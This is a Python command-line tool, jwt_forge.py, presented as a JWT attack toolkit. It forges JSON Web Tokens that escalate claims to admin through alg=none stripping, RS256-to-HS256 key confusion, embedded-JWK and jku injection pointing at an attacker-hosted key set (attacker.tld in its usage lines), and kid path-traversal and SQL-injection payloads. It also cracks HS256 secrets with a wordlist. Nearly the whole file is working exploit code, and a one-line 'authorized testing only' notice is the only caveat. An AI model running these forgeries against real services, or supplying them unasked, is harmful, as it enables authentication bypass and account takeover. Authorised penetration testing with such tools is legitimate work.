#!/usr/bin/env python3
"""
jwt_forge.py - JWT attack toolkit (2024-2026 vectors).

Forges and analyses JSON Web Tokens for the modern attack classes seen in
Parse Server (RS256->HS256 confusion), the alg:"none" class, jku/x5u header
injection, JWK embedded-key injection, and kid SQLi/path traversal.

Modes:
  decode      pretty-print header/payload/signature
  none        strip signature, set alg=none (variants: none/None/nONE)
  hs-confuse  RS256 -> HS256, sign with the server's RSA *public* key as the HMAC
              secret (algorithm confusion). Needs --pubkey.
  jwk         embed an attacker JWK in the header (self-signed RS256)
  jku         set header jku to an attacker JWKS URL (self-signed RS256)
  kid         inject a kid payload (SQLi / path traversal / command) + chosen secret
  bruteforce  HS256 secret crack against a wordlist

Dependency: pip install pyjwt cryptography
(For hashcat-style large cracks use: hashcat -m 16500 jwt.txt wordlist.txt)

Usage:
  python3 jwt_forge.py decode "$JWT"
  python3 jwt_forge.py none "$JWT" --claim sub=admin --claim role=admin
  python3 jwt_forge.py hs-confuse "$JWT" --pubkey server_pub.pem --claim sub=admin
  python3 jwt_forge.py jwk "$JWT" --claim sub=admin
  python3 jwt_forge.py jku "$JWT" --jku https://attacker.tld/jwks.json --claim sub=admin
  python3 jwt_forge.py kid "$JWT" --kid "../../../../dev/null" --secret "" --claim sub=admin
  python3 jwt_forge.py bruteforce "$JWT" --wordlist rockyou.txt

LEGAL: authorized testing only.
"""
import argparse
import base64
import hashlib
import hmac
import json
import sys

try:
    import jwt as pyjwt  # PyJWT
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    HAVE_LIBS = True
except Exception:
    HAVE_LIBS = False


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def parse_token(token):
    parts = token.split(".")
    if len(parts) < 2:
        sys.exit("not a JWT (need at least header.payload)")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    sig = parts[2] if len(parts) > 2 else ""
    return header, payload, sig, parts


def apply_claims(payload, claims):
    for c in claims or []:
        if "=" not in c:
            continue
        k, v = c.split("=", 1)
        # try int/bool/json, else string
        try:
            payload[k] = json.loads(v)
        except Exception:
            payload[k] = v
    return payload


def cmd_decode(args):
    header, payload, sig, _ = parse_token(args.token)
    print("=== header ===");  print(json.dumps(header, indent=2))
    print("=== payload ==="); print(json.dumps(payload, indent=2))
    print("=== signature (b64url) ==="); print(sig or "<none>")


def cmd_none(args):
    header, payload, _, _ = parse_token(args.token)
    payload = apply_claims(payload, args.claim)
    for variant in ("none", "None", "NONE", "nONE"):
        h = dict(header); h["alg"] = variant
        token = f"{b64url(json.dumps(h, separators=(',', ':')).encode())}." \
                f"{b64url(json.dumps(payload, separators=(',', ':')).encode())}."
        print(f"[alg={variant}] {token}")


def cmd_hs_confuse(args):
    if not HAVE_LIBS:
        sys.exit("pip install pyjwt cryptography required for hs-confuse")
    header, payload, _, _ = parse_token(args.token)
    payload = apply_claims(payload, args.claim)
    with open(args.pubkey, "rb") as f:
        pub_pem = f.read()
    # The HMAC secret is the PEM-encoded public key bytes exactly as the server stores it.
    h = dict(header); h["alg"] = "HS256"
    signing_input = f"{b64url(json.dumps(h, separators=(',', ':')).encode())}." \
                    f"{b64url(json.dumps(payload, separators=(',', ':')).encode())}"
    sig = hmac.new(pub_pem, signing_input.encode(), hashlib.sha256).digest()
    token = f"{signing_input}.{b64url(sig)}"
    print(f"[hs-confuse using PEM bytes] {token}")
    # Some servers store the key with trailing newline stripped / different formatting;
    # emit a stripped variant too.
    sig2 = hmac.new(pub_pem.strip(), signing_input.encode(), hashlib.sha256).digest()
    print(f"[hs-confuse using stripped PEM] {signing_input}.{b64url(sig2)}")


def _new_rsa():
    return rsa.generate_private_key(public_exponent=65537, key_size=2048)


def _jwk_from_pub(pub):
    nums = pub.public_numbers()
    def enc(n):
        return b64url(n.to_bytes((n.bit_length() + 7) // 8, "big"))
    return {"kty": "RSA", "e": enc(nums.e), "n": enc(nums.n), "alg": "RS256", "use": "sig"}


def cmd_jwk(args):
    if not HAVE_LIBS:
        sys.exit("pip install pyjwt cryptography required for jwk")
    header, payload, _, _ = parse_token(args.token)
    payload = apply_claims(payload, args.claim)
    priv = _new_rsa()
    jwk = _jwk_from_pub(priv.public_key())
    jwk["kid"] = header.get("kid", "attacker-key")
    headers = {"alg": "RS256", "kid": jwk["kid"], "jwk": jwk}
    token = pyjwt.encode(payload, priv, algorithm="RS256", headers=headers)
    print(f"[jwk embedded-key injection] {token}")
    print("(server must trust the inline jwk header to verify)")


def cmd_jku(args):
    if not HAVE_LIBS:
        sys.exit("pip install pyjwt cryptography required for jku")
    header, payload, _, _ = parse_token(args.token)
    payload = apply_claims(payload, args.claim)
    priv = _new_rsa()
    kid = header.get("kid", "attacker-key")
    headers = {"alg": "RS256", "kid": kid, "jku": args.jku}
    token = pyjwt.encode(payload, priv, algorithm="RS256", headers=headers)
    jwk = _jwk_from_pub(priv.public_key()); jwk["kid"] = kid
    jwks = {"keys": [jwk]}
    print(f"[jku injection] {token}")
    print(f"\nHost this JWKS at {args.jku} :")
    print(json.dumps(jwks, indent=2))


def cmd_kid(args):
    header, payload, _, _ = parse_token(args.token)
    payload = apply_claims(payload, args.claim)
    h = dict(header); h["alg"] = "HS256"; h["kid"] = args.kid
    secret = (args.secret or "").encode()
    signing_input = f"{b64url(json.dumps(h, separators=(',', ':')).encode())}." \
                    f"{b64url(json.dumps(payload, separators=(',', ':')).encode())}"
    sig = hmac.new(secret, signing_input.encode(), hashlib.sha256).digest()
    print(f"[kid injection kid={args.kid!r} secret={args.secret!r}] {signing_input}.{b64url(sig)}")
    print("Examples: kid='/dev/null' secret=''  | kid SQLi: \"x' UNION SELECT 'key'-- -\"")


def cmd_bruteforce(args):
    header, payload, sig, parts = parse_token(args.token)
    if header.get("alg", "").upper() != "HS256":
        print(f"[!] alg is {header.get('alg')}, brute force assumes HS256")
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    target = b64url_decode(sig)
    with open(args.wordlist, "rb") as f:
        for i, line in enumerate(f):
            secret = line.rstrip(b"\r\n")
            calc = hmac.new(secret, signing_input, hashlib.sha256).digest()
            if hmac.compare_digest(calc, target):
                print(f"[+] FOUND secret: {secret.decode(errors='replace')} (line {i+1})")
                return
    print("[-] secret not found in wordlist")


def main():
    ap = argparse.ArgumentParser(description="JWT attack toolkit (2024-2026)")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("decode"); p.add_argument("token"); p.set_defaults(fn=cmd_decode)

    for name, fn in (("none", cmd_none), ("hs-confuse", cmd_hs_confuse),
                     ("jwk", cmd_jwk), ("jku", cmd_jku), ("kid", cmd_kid)):
        p = sub.add_parser(name)
        p.add_argument("token")
        p.add_argument("--claim", action="append", help="key=value (repeatable)")
        if name == "hs-confuse":
            p.add_argument("--pubkey", required=True, help="server RSA public key PEM")
        if name == "jku":
            p.add_argument("--jku", required=True, help="attacker JWKS URL")
        if name == "kid":
            p.add_argument("--kid", required=True)
            p.add_argument("--secret", default="")
        p.set_defaults(fn=fn)

    p = sub.add_parser("bruteforce")
    p.add_argument("token"); p.add_argument("--wordlist", required=True)
    p.set_defaults(fn=cmd_bruteforce)

    args = ap.parse_args()
    args.fn(args)


if __name__ == "__main__":
    main()
